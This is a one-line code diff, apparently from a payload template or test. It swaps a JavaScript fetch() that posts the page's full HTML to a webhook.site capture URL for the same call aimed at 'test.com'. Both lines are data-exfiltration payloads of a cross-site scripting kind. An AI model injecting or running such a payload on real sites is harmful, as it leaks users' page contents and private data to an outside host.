@@ -1,1 +1,1 @@
-fetch('https://webhook.site/3c78485e-03d6-42f7-8a44-17fdf6c3b00a/', {{method: 'POST', body: document.documentElement.innerHTML }});
+fetch('test.com', {{method: 'POST', body: document.documentElement.innerHTML }});
